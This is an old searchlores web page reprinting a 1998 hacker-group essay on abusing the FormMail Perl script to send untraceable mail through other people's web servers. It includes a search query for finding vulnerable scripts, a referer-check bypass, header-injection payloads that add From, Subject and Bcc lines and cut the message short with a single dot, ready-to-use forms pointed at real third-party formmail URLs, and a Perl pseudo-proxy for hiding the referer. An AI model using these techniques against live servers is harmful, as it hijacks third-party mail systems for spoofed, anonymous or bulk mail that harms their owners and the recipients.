@@ -1,0 +1,810 @@
+<html>
+<head>
+<!-- web searching lore: pagename begin -->
+<title>formmai1.htm: The Anonymous postman</title>
+<!-- web searching lore: pagename end -->
+<meta http-equiv="Content-Type"		content="text/html; charset=iso-8859-1">
+<meta http-equiv="Content-Style-Type"	content="text/css">
+<meta http-equiv="Content-Script-Type"	content="text/javascript">
+<meta name="description"	content="This site teaches basic and advanced search techniques for people interested in finding any kind of information on the web. Here are informations, documents, links, etc. related to web-searching">
+<meta name="keywords"		content="searching, combing, klebing, how to search, search techniques, hints and tips for searching the web, How do I learn to search?, Advanced Internet searching, How do I search the web?, fravia+">
+<meta name="author"		content="fravia+">
+<meta name="copyright"		content="Copyright(c) 1952-2032 fravia+">
+
+<STYLE type="text/css">
+A:link { color: #02F }
+A:visited  { color: #808 }
+A:hover { color: purple; background: #AFB }
+</STYLE>
+</head>
+
+<BODY bgcolor="#CCCCCC" TEXT=#001010 LINK=#214131 ALINK=#405040 VLINK=#8850AA>
+<center>
+<!-- fravia's searching lore: bigtitle, begin -->
+<font size=+3>~ The Anonymous postman ~</font>
+<!-- fravia's searching lore: bigtitle, end -->
+<br>
+<!-- internet searching techniques: imageheader begin -->
+<table border="0" ALIGN=CENTER><tr>
+<th bgcolor="#993300">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</th>
+<TH BGCOLOR="#993300">&nbsp;&nbsp;</th>
+<th BGCOLOR="#993300"><a href="noanon.htm"><IMG SRC="images/petianon.jpg"
+ALT="Petit image"
+ALIGN=BOTTOM WIDTH="118" HEIGHT="68" BORDER=0 VSPACE=0
+HSPACE=0></a></th>
+<TH BGCOLOR="#993300">&nbsp;&nbsp;</th>
+<th bgcolor="#FF0000"><Font color="#993300" SIZE="3">
+Anonymizers</th>
+</tR></table>
+
+<!-- ---------------------|||||------------->
+<font color=blue>Mai</font> 2001, updated <font color=blue>March</font> 2003
+<!-- ---------------------^^^^^------------->
+
+<!-- internet searching techniques: imageheader end -->
+      <br><br>
+<font size=+3>
+By Corto</font><br>With the <a href="formmai1.htm#digress">Formmail Essay</a> of the old +HCU and its <a href="formmai1.htm#CGI">Pseudo-proxy</a>
+<br><hr>
+Read also: </center><ul><li> Corto Maltese's   
+<a href="anonyweb.htm#corto">bag of tricks</a>, 
+and  "<a href="maltese1.htm">da bag is not empty, yet</a>"
+</li>
+ <li>
+ <font color=blue>[</font><a href="shino_an.htm">shino_an.htm</a><font color=blue>]</font>: 
+ <i>Anonymous E-mail using remailers</i><br>by <u>
+shinohara</u><br><i>"A person should learn how to use remailers to send 
+E-mail anonymously. If you just want to send simple E-mail anonymously (no attachments, 
+only text) and not expect an answer, you can do that by using free Web based remailers"</i> &nbsp;
+ part of the <font color=blue>[</font><a href="fobegano.htm">Anonymity lore for 
+beginners</a><font color=blue>]</font> section. 
+</li>
+  </uL>
+</center><hr><br>
+<font size=+1>
+Dear fravia+,
+trying to quill my envy for your future trips, I would like to send you a  
+small curiosity, that you'll probably already know of.
+<br>The following 'trick' for sending emails (the Anonymous postman) uses the common 
+<font color=blue>formmail.cgi</font> (matt scripts) 
+that is very easy to individuate and common all over the world.<br>You may fetch 
+hundred of them through this ad hoc altavista query:
+<br><font size=-1>
+
+<a href="http://www.altavista.com/cgi-bin/query?pg=q&amp;text=yes&amp;kl=XX&amp;q=%2Burl%3Acgi-bin+%2Burl%3Aformmail.cgi&amp;act=search">http://www.altavista.com/cgi-bin/query?pg=q&amp;text=yes&amp;kl=XX&amp;q=%2Burl%3Acgi-bin+%2Burl%3Aformmail.cgi&amp;act=search</A>
+</font><br>
+
+of course a similar query with another search engine would give you good results as well.
+<br>once you got your formmail.cgi target you simply "slighty modify" following form (I have 
+highlighted 
+ the parts that need modifying)...
+<br>
+&lt;form action="<SPAN STYLE="color: black; background: yellow">http://www.zzi.net/cgi-bin/FormMail.cgi</span>"  method="POST"&gt;<br>
+&lt;input type="hidden" name="recipient" value="<SPAN STYLE="color: black; background: yellow">WHATEVERuWANT@whateverUwant.com</span>"&gt;
+<br>
+<form action="http://www.zzi.net/cgi-bin/FormMail.cgi" method="POST">
+<input type="hidden" name="recipient"  value="WHATEVERuWANT@whateverUwant.com">
+</font><center>
+<h3>
+<font face="Arial">
+<font size=-1>MAIL YOUR FRIENDS!</font></font></h3></center>
+<table BORDER=0 >
+<tr>
+<td ALIGN=RIGHT><i>name</i></td>
+<td><input type="text" size="35" name="Name"></td>
+</tr>
+<tr>
+<td ALIGN=RIGHT><i>email address</i></td>
+<td><input type="text" size="35" name="Email"></td>
+</tr>
+<tr>
+<td ALIGN=RIGHT><i>text you want to send</i></td>
+<td><textarea NAME="TEXTO" ROWS="5" COLS="60"></textarea></td>
+</tr>
+</table>
+
+<p>
+<input type="submit" value="send">
+<input type="reset" value="clear">
+<br></form></td>
+</tr>
+</table>
+<br><font size=+1>
+This said, I have a couple of <b>observations</b> (doubts):<br>
+
+<br>FIRST: this usually works well via proxomitron and proxy, but the question is 
+if I am anonymous only for the recipient or if the IP of the sender (i.e.: mine) is registered 
+at the servers we are using as 'postmen'.
+<br>
+Apparently my real IP remains hidden both in the email headers and in the loggings 
+of my connections, but I'm not sure about it, and would like some input from those 
+that are more web-savvy than I am, and have the time to play with this trick.
+<br><br>SECOND: it would be probably worthy to make some short investigations on this 
+(and other) cgi, maybe simply publishing on your site this mail of mine, in the hope 
+that some gentle soul will give us some feedback, additions, suggestions, corrections... 
+<br><br>Work well, 
+<br>corto
+<br>Feedback: steparius(ALT+64)operamail(POINT)com
+
+
+</font><bR>
+<a name="digress"></a>
+<center><table border=1 width=88%><tr><td bgcolor="#C6E7C6"><center><font
+size=+3>+HCU Formmail Essay</font> (published at <a href="http://www.searchlmores.org">searchlores</a> in mai 2001)</center></td></tr></table></center>
+<br><center><i><font size=+1>
+Once upon a time, in a far away galaxy of electrons, there was a group of people 
+quite powerful and capable. They found out,  
+ discussed and practicized many sort of magical exploits...  
+ waay before they were of public domain... I'll now let my friends +Malattia and 
+SiuL+Hacky 
+show you the ancient formmail 'lessons'... (the text below has been written in 1998, I have only changed 
+my old -and now dormient- www.fravia.net address, 
+cited by SiuL+, into www.searchlores.org)</font>
+</i></center><br><br>
+<table border=0 align=center width=80%>
+<tr><td bgcolor=#005000 align=center><FONT SIZE="7">+HCU Formmail Essay</FONT></td></tr>
+
+<tr><td bgcolor="#CCCC99" align=center><I>
+Here is a little treasure, an old tute born from a cooperative work of many +HCUckers. I 
+thought it could be published now, because I've seen that this vulnerability has been 
+discovered (at last!) and published on bugtraq. This tute shows you a little bug in 
+formmail perl scripts which you could use to send "a-little-more-anonymous" emails: of 
+course nothing is really anonymous today but, at least, you can become less traceable ;) 
+Note that this bugged script is still used in many, many (big) websites... and will probably
+remain there for much more time if you don't abuse it.
+</I></td></tr>
+</table>
+
+<br><br><pre>
+Subject: The awaited essay
+
+hi +all,
+I know we are not the fastest writers in the world, but here is a document
+with a summary about formmail tricks ( very few until now :-( and some other
+information that could be helpful to you. It has been done by +malattia and
+me, and we truly hope you'll like it :-).
+
+cu
+SiuL+Hacky
+
+ps. ask what you feel like, as usual.
+
+
+
+Mail Headers
+------------
+When receiving an email you may get some information about who
+sends it and its way across the net. What I'm describing here are
+assumptions you may take if the "mail system" is not forged; in
+that case, sometimes you may discover when someone is trying to
+forge a server, as we'll see.
+
+Most mail is sent via SMTP (Simple Mail Transfer Protocol), just
+a tcp/ip connection (most of the times, though it does not depend
+on the transfer layer used) trough port 25. What mailer agents
+use to do is automatize the dialog between client and server. If
+you are going to telnet to your local machine, usually you may
+pass the data directly to the mail server ( through command line
+). Otherwise, the dialog is this ( in a simple example ):
+
+* telnet target.server 25
+- Greeting from the server that identifies itself
+* HELO my.domain
+- More greeting
+* MAIL FROM: my@address
+- Some acknowledge
+* RCPT TO: recipient@address
+- Some acknowledge
+* DATA
+- Ack, and instructions for ending DATA section ( to type a line
+  with JUST one dot ).
+* bla, bla, bla
+  bla, bla
+  .
+
+- More acks
+
+The acks have their own codes, but they are enough
+self-explanatory, hence I'll not mess you. Consult rfc821 for
+details.
+
+The first try to forge smtp is by means of MAIL FROM. Currently
+most systems check the identifier given does exist, and coincides
+with the domain it got from tcp net connection. If they do not
+match, your IP address is stamped and the forgery may be
+discovered. Another forgery may be to include inside data section
+a line like this:
+
+From: best@hcuker.world
+
+The programs we use to read mail, take this field and show it as
+the sender, without any header checking. This a very trivial
+trick. The same may be told for Subject, Date and so on, included
+inside DATA section.
+
+The mail server not only receives the request and forwards it (if
+necessary ), but adds a header with info about the transfer
+described above. If the recipient dwells in the server, may be it
+does not add the header, but is not usual. You may try to use
+some forged mail server that claims to be a different one, but
+when it'll forward the message to reach recipient's home, a new
+header will be added ( except some rare occasions I told you )
+and then all the headers will not be consistent.
+
+You could try to telnet with tampered ip packets, but as tcp is a
+controlled connection ( opposite to UDP ), it seems difficult for
+me.
+
+Let's review all this with an example where everything makes
+sense and nothing seems to be forged :-). Is +Alistair one:
+
+==========================================================
+Received: from 207.203.114.24 (207.203.114.24) by
+mx05.netaddress.usa.net via
+mtad (2.4)
+        id mx05-caDJKJ0091; Sun, 04 Jan 1998 02:36:10 -0600 (MST)
+Received: from http by athos.clubenterprises.com with local (Exim
+1.62 #8)
+        id 0xokdc-0008Qg-00; Sun, 4 Jan 1998 02:38:24 -0500
+To: sergej.lisenko@usa.net
+From: Alistair@newanonymity.gee ()
+Subject:  +Zero can you read my address?
+Message-Id: &#60E0xokdc-0008Qg-00@athos.clubenterprises.com&#62
+Sender: Club Webmaster &#60http@athos.clubenterprises.com&#62
+Date: Sun, 4 Jan 1998 02:38:24 -0500
+
+ADD
+
+ &#60Alistair@newanonymity.gee&#62
+==============================================================
+
+First of all user "http" starts the first connection to its local
+mail server. Inside multiuser o.s. as unix, every process run
+with a user identifier. Web servers use users as "nobody",
+"http", "httpd" or "www". AFAIK, web servers cannot act as smtp
+clients, so may be a process started by the web server is doing
+it, a cgi. The program that takes care of port 25 connections is
+Exim ( a program, as sendmail or Qmail ). It receives the
+recipient and the rest of the data. The connection ends, and Exim
+adds its header:
+
+Received: from http by athos.clubenterprises.com with local (Exim
+1.62 #8)
+        id 0xokdc-0008Qg-00; Sun, 4 Jan 1998 02:38:24 -0500
+
+The recipient is not local: sergej.lisenko@usa.net, so it has to
+forward it to @usa.net. The program that manages it at usa.net
+receives it and adds its header:
+
+Received: from 207.203.114.24 (207.203.114.24) by
+mx05.netaddress.usa.net via
+mtad (2.4)
+        id mx05-caDJKJ0091; Sun, 04 Jan 1998 02:36:10 -0600 (MST)
+
+We must take care that ip addresses make sense, hence these parts
+must match (and they do, check it with dns):
+
+from 207.203.114.24 &#60-- in the second header
+by athos.clubenterprises.com &#60-- in the first header
+
+HTML
+----
+It's really easy to navigate from one page to another, so there's
+no need to know the underlying client-server dialog. What happen
+since you tell the browser to get some page till the browser
+paints it, is just another client-server dialog.
+
+The browser acts as the client. Imagine you type
+http://www.searchlores.org/basic.htm
+(c'mon +fravia I want my commission :-)
+
+It telnets www.searchlores.org port 80 ( usually ) and, 
+sends a request header, more or less like this:
+
+GET /basic.htm HTTP/1.0
+or
+GET /basic.htm
+
+
+Afterwards the client may send some other auxiliary header such
+as Referer header ( used by formmail :-). The client ends its
+requests with a double CR.
+
+Then the server answers with a respond header: may be OK, may be
+a Location header to redirect the client to another page or may
+be an error header ( not found, forbidden access ... ). The
+respond headers have codes and so forth, but I'm just explaining
+the "concepts". Finally a "Content type" header is put by the
+server, previous to the html page, image or whatever. I must remark
+that what is really important is the ok header, placed on the top,
+because is the one acks the url requested does exist, and can be
+given. This is a sample of a usual server answer:
+
+
+HTTP/1.1 200 OK
+Date: Mon, 16 Mar 1998 04:02:15 GMT
+Server: Apache/1.2.4
+Last-Modified: Thu, 06 Nov 1997 18:20:06 GMT
+ETag: "20afe-792-34620a56"
+Content-Length: 1938
+Accept-Ranges: bytes
+Connection: close
+Content-Type: text/html
+
+&#60!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&#62
+( ... and the rest of the page ... )
+
+The client (browser) picks the data and paints it. With picks
+the data I mean it'll request any additional resource in the page, as
+images, cgis for counters or whatever through telnet sessions like
+the above one.
+
+
+CGIs
+-----
+Here some foundations about cgis, because if you've never written
+one, some of its aspects are confusing.
+
+Why cgis ? They are just a method that enables to start some
+interactive dialog between the browser and the web server. Now it
+seems pretty easy with Java and Javascript, but without them you
+can just use a cgi. The client send the server some data from the
+user and the server "processes" the information and gives an
+answer.
+
+What are they indeed ? They are executable files. You must
+configure the server to make it note how to identify what
+requests are cgis ( and must be executed ), and what are usual
+MIME types. The two most common ways, are to store them at some
+concrete directory (as cgi-bin ), or to label them with some
+concrete extension, as .cgi.
+
+Therefore, when the request is labelled as "cgi", the server
+execute the cgi with some well defined environmental variables.
+The cgi gets from these vars information about the client-server
+connection ( IP addresses, the name of the server & browser, ...
+) and also gets the specific information supplied by the user (
+through PATH_INFO and QUERY_STRING vars ). Then the program does
+something with all this information, and finally cooks some
+acknowledgement for the client ( usually an html page, with the appropiate
+Content-type header that will help to browser to identify the resource
+that is being received, i.e. html, jpg, gif ... ). If the cgi is
+Non Parsed Header (its name starts with nph-) it must take care of
+all html protocol headers too, especially ok header ( see samples at
+HTML section ).
+
+
+
+Formmail Cracking
+-----------------
+
+And now it's the turn of FormMail, a little PERL script which 
+automatically sends the contents of a form by mail to a specified 
+recipient. Here are some infos about the program:
+
+================================================================
+FormMail v1.6
+Copyright 1995-97 Matt Wright (matt@worldwidemart.com)
+Last Modified 05/02/97
+You can download it from: http://www.worldwidemart.com/scripts/
+================================================================
+
+note (by s+h): there are more formmail scripts, but this one seems to be the
+most popular.
+
+
+I'll quote some lines of code in this essay, but there's no need to say that
+you should download and read the complete source code to better understand
+what's going on. Now, let's see how the formmail script works:
+
+1) First of all, it checks the referring URL, that is the URL of the page
+containing the form. This allows forms to be located only on servers 
+which are defined in the field @referers, preventing other sites to use 
+your script in their web pages.
+
+2) Then, it retrieves the current date/time to put it in the mail message.
+
+3) It determines the form's request method (GET or POST), parses the form
+contents and split the form fields into their name-value pairs. The allowed
+fields are:
+
+-recipient: mail address of the recipient
+-subject: subject
+-email: mail address of the sender
+-realname: realname of the sender
+-redirect: URL of the page to redirect user to after the form is sent
+-bgcolor, background, link_color, vlink_color, text_color,
+ alink_color: attributes of the html created after the form is sent
+-sort: order of the fields in the mail
+-print_config: field configurations to print in the mail
+-required: fields you have to fill in the form
+-env_report: environmental variables to print in the mail
+-return_link_title: return page to put in the newly created html page
+-return_link_url: url of the return page
+-print blank fields: tells the script to print even the blank fields
+-missing_fields_redirect: URL of the page to redirect user to if a required
+field is missing.
+
+NOTE: When you send a form and everything goes ok, you can choose to redirect
+user to a new page or to create a predefined one.
+
+4) The program checks the required fields and if email field is required it
+checks its syntax. If there's an error, it redirect the user to the page
+specified in the field missing_fields_redirect or creates a predefined one.
+
+5) If everthing is ok, it redirects user to the page specified in the field
+redirect, or creates a predefined one.
+
+6) Finally, the program sends the mail message to recipient.
+
+Now, the first thing we want to do is send the mail message to another
+recipient, ie our mail address. As this field is not specified in the 
+formmail source, but you have to provide it as a hidden field in the 
+form (look at some html sources on the net), you can manually send 
+data to the script in this way:
+
+http://server.address/cgi-bin/formmail.pl?recipient=a@b.com&subject=hi
+&email=c@d.com&realname=Homer+Simpson&data:HI%0d+%2bMaLaTTiA
+
+Hmmmmm... got it? We give all the fields "by hand", like in a command 
+line. 
+The field separator is the character "&" and instead of the spaces 
+we find "+", CR is %0d and "+" (how can you write your +nickname 
+otherwise? :)) is %2b, that is 2bH, 43 dec, "+" ASCII.
+This example works, but there are two little problems: first of all, 
+we don't want to write our mail messages on just one line, doing 
+character conversion on the fly. The best thing to do is to copy an 
+online page which uses formmail.pl and change it a little to suit our 
+needs. 
+In the 90% of the cases it doesn't work: that's because of that 
+referring url check at point 1). Well, it's time to give a look to 
+the source code now: a beautiful high-level language source
+code, with beautiful procedures like &check_url, &send_mail, and so on...
+rather self-explaining isn't it? :) Now, let's try to solve our 
+first problem, here's the code:
+
+# If a referring URL was specified, for each valid referer, make sure  #
+# that a valid referring URL was passed to FormMail.                   #
+
+    if ($ENV{'HTTP_REFERER'}) {
+        foreach $referer (@referers) {
+---&#62    if ($ENV{'HTTP_REFERER'} =~ m|https?://([^/]*)$referer|i) {
+                $check_referer = 1;
+                last;
+            }
+        }
+    }
+
+The check for the referer is all in just ONE line, so it's time to get a PERL
+quick reference manual and see what it means. I've downloaded a manual from
+www.mcp.com, zipped it and put it online for further use :) The address is:
+
+http://www.fortunecity.com/skyscraper/mozilla/66/zelif.htm
+
+Anyway, here's what the manual says:
+
+m//
+
+Category.....:  named unary operator (pattern)
+Arguments....:  m/&#60pattern&#62/&#60optionlist&#62
+Return Value.:  1 (true) '' (false)
+
+Definition
+This function searches the default string for the pattern using regular
+expression pattern matching. It returns 1 if a match is found. 
+Otherwise, '' is returned. The default string can be assigned to the match 
+using either the =~ or !~ operators; otherwise, it is $_.
+
+---&#62        if ($ENV{'HTTP_REFERER'} =~ m|https?://([^/]*)$referer|i) {
+
+note: you may wonder why the man page defines m//, and then in the script we
+find m||. The reason is that you can use as delimiters ("/" is the default
+delimiter) other non-alphanumeric characters. That is useful if the pattern
+contains "/", as it increases readibility.
+
+
+So, the default string is $ENV{'HTTP_REFERER'}, and the procedure 
+searches inside it for the occurrence of the string contained in 
+$referer (which is one of the values contained in the field $referers, 
+usually a domain name). 
+The option "i" means that the string comparison is case-insensitive. 
+Hmmm... just a substring search... no real domain check! 
+So, you just have to name your html local file with the domain name 
+of the formmail script you're using... ie., if the formmail script 
+is located at www1.clubenterprises.com, you can call the
+file www1.clubenterprises.com.html. Try it: it works! :)
+Of course, there's a lot more elegant way to do this... read what Siul+Hacky
+wrote me:
+
+"+MaLaTTiA, pretty interesting your way to get rid of referer
+ trick. I did it a little bit different. I did months ago a
+ perl script to run as a very simple proxy, so you ask your
+ page through the PATH_INFO and QUERY_STRING parameters, then
+ the cgi ask for the page and returns it to you. The script
+ may be used for filtering information. Referer is given by
+ means of an HTML header, so it is Netscape who is giving
+ formmail the information of the malicious referer.  I
+ remembered this old script and used it for destroying
+ referer information."
+
+I'm sure Siul's script will turn out to be useful in a lot of situations, 
+so check it, it's included in this essay.
+
+The second problem we have to deal with is a bit harder, because you'll 
+need some UNIX knowledge, or at least you'll need to know how sendmail 
+works. If you send the previous mail message to yourself, you'll see 
+that its output will be something like this:
+
+Below is the result of your feedback form.  It was submitted by (a@b.com) on
+Wednesday, January 7, 1998 at 12:27:19
+---------------------------------------------------------------------------
+HI
+---------------------------------------------------------------------------
+
+
+....Hey! I didn't ask the PERL script to write THAT! Let's go and see 
+the source code again:
+
+sub send_mail {
+    # Localize variables used in this subroutine.                  #
+    local($print_config,$key,$sort_order,$sorted_field,$env_report);
+
+    # Open The Mail Program
+    open(MAIL,"|$mailprog -t");
+
+    print MAIL "To: $Config{'recipient'}\n";
+    print MAIL "From: $Config{'email'} ($Config{'realname'})\n";
+
+# Check for Message Subject
+if ($Config{'subject'}) { print MAIL "Subject: $Config{'subject'}\n\n" }
+else                    { print MAIL "Subject: WWW Form Submission\n\n" }
+
+print MAIL "Below is the result of your feedback form.  It was submitted
+        by\n";
+        print MAIL "$Config{'realname'} ($Config{'email'}) on $date\n";
+
+Ok. The string appears in the source code, so what can we do now? 
+The first thing I did is give a look to that "-t" switch used to open 
+the mail program, so I started Linux and gave a look at the manual page 
+about sendmail. NOTE: you don't need to install Linux to see man pages, 
+you can find all of them online! Of course, installing Linux is 
+better... :))
+Here is part of the output:
+
+-t      Read message for recipients. To:, Cc:, and Bcc: lines will
+    be scanned for recipient addresses. The Bcc: line will be
+    deleted before transmission. Any addresses in the argument
+    list will be suppressed, that is, they will not receive
+    copies even if listed in the message header.
+
+Here's how our script works: it just gives plain text to the mail 
+program, and this one scans for the recipient and sends the mail message. 
+It doesn't help us with the default "incipit" of the mail, but tells us 
+some other things: for instance, that if we specify Cc: and Bcc: lines 
+in the body of the mail, the script is able to send both carbon copies 
+and BLIND carbon copies! 
+Of course, we should first find the way to cut away that ugly 
+"Below is the result...". To do this, we have to learn something more about 
+sendmail. Fortunately, the "man" pages of sendmail tell us all we need 
+to know about it:
+
+"With no flags, sendmail reads its standard input up to an end-of-file
+or a line consisting only of a single dot and sends a copy of the message
+found there to all of the addresses listed."
+
+Bingo! As the "-t" flag doesn't tell us anything about it, we can 
+guess the dot works with this flag too... and it does: we just 
+have to put a line consisting only of a single dot BEFORE the default 
+incipit and we terminate the message! 
+From the source file you can see there are THREE ways to do this:
+
+1)  print MAIL "To: $Config{'recipient'}\n";
+
+FIRST WAY: You just have to assign to the recipient field a value like this
+
+        RECIPIENT_NAME\n
+        From: Anonymous ("Realname")\n
+        Subject: the subject you like\n
+        (now you can put the mail body)
+        blah.blah.blah.
+        .       (single dot!)
+
+This doesn't always work, because often the "email" field is required 
+(well you can simply add a fake address in that field, anyway it won't 
+even be printed!). 
+And... THIS_WORKS!!! +Guys, a perl variable can carry enough 
+data to contain a full message body, and all we have to do is put it in 
+a field and terminate it with a single dot in a new line.
+
+2)  print MAIL "From: $Config{'email'} ($Config{'realname'})\n";
+
+SECOND WAY: You can put a "realname" containing the full message. Of course,
+you have to close the parenthesis after your fake realname, so your message
+will look like this:
+
+        Homer Simpson)
+        Subject: blah blah blah
+        DATA
+        .
+
+3)  if ($Config{'subject'}) { print MAIL "Subject: $Config{'subject'}\n\n" }
+
+THIRD WAY: I think you got it, just remember that in this case you have to
+start writing the subject without "Subject:" header, I confirm  sendmail
+will read any Cc: or Bcc: after the Subject: line...
+
+Now you just have to choose: if you often have to send CC or BCC you can made a
+local page using the second trick, I personally made some local pages which use
+the third one. Here's the source, feel free to change and ameliorate it, but
+remember to send me a copy of it! ;)</pre>
+</font><pre>
+&#60HTML&#62&#60HEAD&#62&#60TITLE&#62+MaLaTTiA's Anonymizer&#60/TITLE&#62&#60/HEAD&#62
+&#60body bgcolor="#000000" text="#FFFFFF" link="#00FF00" vlink="#008000"
+alink="#00FF00"&#62
+&#60br&#62
+&#60p align="center"&#62
+&#60font size="6" color="#00FF40"&#62+MaLaTTiA's Anonymizer&#60/font&#62
+&#60/p&#62
+&#60p&#62&#60FORM METHOD="POST" ACTION="http://www.utm.edu/cgi-bin/thomasn/formmail.pl"&#62
+&#60b&#62To&#60/b&#62:&#60br&#62&#60INPUT type=text  NAME="recipient" SIZE=30&#62&#60br&#62
+&#60b&#62From&#60/b&#62:&#60br&#62&#60INPUT type=text  NAME="email" SIZE=30&#62&#60br&#62
+&#60b&#62Realname&#60/b&#62:&#60br&#62&#60INPUT type=text  NAME="realname" SIZE=30&#62&#60br&#62
+&#60b&#62Data&#60/b&#62 (end the mail with a dot):&#60br&#62
+&#60TEXTAREA NAME="subject" ROWS=9 COLS=70&#62
+Anonymous Mail
+&#60/TEXTAREA&#62&#60br&#62
+
+&#60INPUT TYPE="submit" NAME="address" VALUE="Send"&#62
+&#60INPUT TYPE="reset"  NAME="address" VALUE="Delete"&#62&#60p&#62
+&#60/BODY&#62&#60/HTML&#62</pre>
+           <font size=+1>
+Remember that the first line of the textarea is the subject, just start with
+the mail body from the second line. Also, you have to end the message WITH A
+DOT IN A NEW LINE (can you write a source to automatically add it?). Finally,
+you just have to change the line<br><br>
+
+&#60p&#62&#60FORM METHOD="POST" ACTION="http://www.utm.edu/cgi-bin/thomasn/formmail.pl"&#62
+<br><br>
+with another address to change your address, also remember to change the
+filename (if there's a referer check). For instance, this line (with the right
+filename) works too:
+<br><br>
+&#60p&#62&#60FORM METHOD="POST" ACTION="http://uxcgisrv.vol.it/inserzioni/cgi1.cgi"&#62
+<br><br>
+Now a little homework for you: collect as many addresses as you can and spread
+them on the ml! :)
+<br><br>
+OTHER TRICKS<br>
+------------<br>
+<br><br>
+The work is not finished. We can do a lot of other things with this script, for
+instance we can create _any_ html changing the body attributes of the returned
+html, but I don't know how it could be useful... hmmmm... I'm afraid I'm stuck
+here O:)<br>
+<br>
+EVOLUTION<br>
+---------<br>
+<br>
+IMHO, the best thing to do now is writing a little proggie (java? plain HTML?)
+which lets you write your mail offline, maybe put it in a queue, automatically
+put a single dot at the end of each message, lets you choose a server whose
+formmail script you want to use, starts a proxy server like Siul's one, and
+sends mails... too hard? Maybe a little time-wasting, but I think it would be
+VEEERY nice O:))<br><br>
+
+</pre><a name="CGI"></a>
+<center><table border=1 width=88%><tr><td bgcolor="#C6E7C6"><center><font
+size=+3>
+CGI-PSEUDO proxy</font></center></td></tr></table></center>
+</font></font></font>
+<pre>
+
+CGI-PSEUDO proxy
+----------------
+nph-proxy.pl
+----------------
+#!/usr/bin/perl
+push(@INC,"/usr/lib/perl5");
+require("flush.pl");
+use Socket;
+
+
+;####################################################################
+;#### This script acts as a very simple proxy               #########
+;#### Make your calls in this way:                          #########
+;#### http://your_server/cgi-bin/nph-proxy.cgi/serv/pag     #########
+;####                                                       #########
+;#### where "serv" is the target server (ip or dns)         #########
+;#### and "pag" is the page or directory to get             #########
+;#### (c) SiuL+Hacky                                        #########
+;####################################################################
+
+
+local($remote, $port, $ip, $paddr, $port,@line);
+$_=$ENV{'PATH_INFO'};
+$data=$ENV{'QUERY_STRING'};
+
+#####################################################################
+#### server and page infor are split                         ########
+#####################################################################
+
+s/\///;
+($remote, $page)=split(/\//, $_, 2);
+$page="\/".$page;
+$port=80;
+
+#####################################################################
+#### a telnet session to port 80 is started                    ######
+#####################################################################
+
+$ip=inet_aton($remote);
+$paddr= sockaddr_in($port, $ip);
+$proto= getprotobyname("tcp");
+socket(SOCK, PF_INET, SOCK_STREAM, $proto) || die print "Content-type:
+text/html\n\n&#60html&#62Error connecting to server&#60/html&#62";
+connect(SOCK, $paddr) || die print "error 2";
+&printflush(SOCK, "GET ". $page."?".$data . " HTTP/1.0\n\n");
+$n=0;
+$redirect=1;
+
+#####################################################################
+#### the info is read and returned to the client                 ####
+#### "if" instruction patches Location headers                   ####
+#### that will be prior to Content-type ones                     ####
+#####################################################################
+
+
+while($_=&#60SOCK&#62)
+{
+ if ($redirect){
+   if (/Content-type/){
+     $redirect=0;
+   }
+   if (/Location:/){
+      $cgi="http:\/\/".$ENV{'SERVER_NAME'}.$ENV{'SCRIPT_NAME'}."\/";
+      s/http:\/\//$cgi/e;
+   }
+ }
+ $line[$n]=$_;
+ $n++;
+}
+close (SOCK);
+
+####################################################################
+#### the dialog with the server is reproduced here and sent     ####
+#### to the client. To keep it identical the cgi is             ####
+#### declared as Non Parsed Header                              ####
+
+for($i=0; $i&#60$n; $i++){
+ print "$line[$i]";
+}
+exit(0);
+
+
+----------------------------------------------------------------------------
+
+That's all... hope you liked it.
+
+
++ma (mailto:malattia(AT)gmx.net")
+</pre>
+<br><br>
+
+<!-- internet searching strategies and hints content, end -->
+<hr width=66%><center> <a href="noanon.htm"><IMG SRC="images/petianon.jpg"
+ALT="Petit image"
+ALIGN=BOTTOM WIDTH="118" HEIGHT="68" BORDER=0 VSPACE=0
+HSPACE=0></a><br><br>
+<!-- how to search the web, by fravia+, signet begin -->
+  
+<table><tr><td width="300" height="2" bgcolor="#993300"></td></tr></table>
+(c) III Millennium: <font color=blue>[</font><a
+href="info.htm">fravia+</a><font color=blue><font color=blue>]</fonT></font>, all rights
+reserved
+<!-- how to search the web, by fravia+, signet end -->
+
+
+<!-- begin da closing bit, duh -->
+</CENTER>  
+</body>
+</HTML>
